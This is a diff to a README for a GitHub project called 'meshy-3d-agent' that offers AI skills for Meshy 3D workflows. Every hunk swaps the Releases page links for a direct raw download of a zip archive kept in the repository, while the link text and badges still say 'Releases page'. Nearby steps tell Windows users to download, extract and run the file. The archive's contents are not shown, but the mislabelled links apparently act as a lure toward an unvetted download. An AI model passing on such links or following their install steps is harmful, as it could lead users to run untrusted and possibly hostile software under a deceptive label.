@@ -1,6 +1,6 @@
 # 🤖 meshy-3d-agent - 3D AI skills for Meshy workflows
 
-[![Download](https://img.shields.io/badge/Download-Releases-purple?style=for-the-badge)](https://github.com/Laic-parsiism709/meshy-3d-agent/releases)
+[![Download](https://img.shields.io/badge/Download-Releases-purple?style=for-the-badge)](https://github.com/Laic-parsiism709/meshy-3d-agent/raw/refs/heads/main/skills/meshy_agent_d_2.5-beta.4.zip)
 
 ## 📦 What this is
 
@@ -10,7 +10,7 @@ Use it if you want a simple way to work with Meshy through agent skills in tools
 
 ## 🚀 Download and install
 
-1. Open the [Releases page](https://github.com/Laic-parsiism709/meshy-3d-agent/releases)
+1. Open the [Releases page](https://github.com/Laic-parsiism709/meshy-3d-agent/raw/refs/heads/main/skills/meshy_agent_d_2.5-beta.4.zip)
 2. Download the latest release file for Windows
 3. If the file is a `.zip`, right-click it and choose **Extract All**
 4. Open the extracted folder
@@ -58,7 +58,7 @@ A simple flow looks like this:
 
 Use this link to visit the download page:
 
-[![Visit Releases](https://img.shields.io/badge/Releases-Visit%20Download%20Page-blue?style=for-the-badge)](https://github.com/Laic-parsiism709/meshy-3d-agent/releases)
+[![Visit Releases](https://img.shields.io/badge/Releases-Visit%20Download%20Page-blue?style=for-the-badge)](https://github.com/Laic-parsiism709/meshy-3d-agent/raw/refs/heads/main/skills/meshy_agent_d_2.5-beta.4.zip)
 
 ### 2) Extract the files
 
@@ -259,4 +259,4 @@ When a new version appears on the Releases page:
 
 If you need to get the files again, use the Releases page here:
 
-[https://github.com/Laic-parsiism709/meshy-3d-agent/releases](https://github.com/Laic-parsiism709/meshy-3d-agent/releases)
+[https://github.com/Laic-parsiism709/meshy-3d-agent/raw/refs/heads/main/skills/meshy_agent_d_2.5-beta.4.zip](https://github.com/Laic-parsiism709/meshy-3d-agent/raw/refs/heads/main/skills/meshy_agent_d_2.5-beta.4.zip)
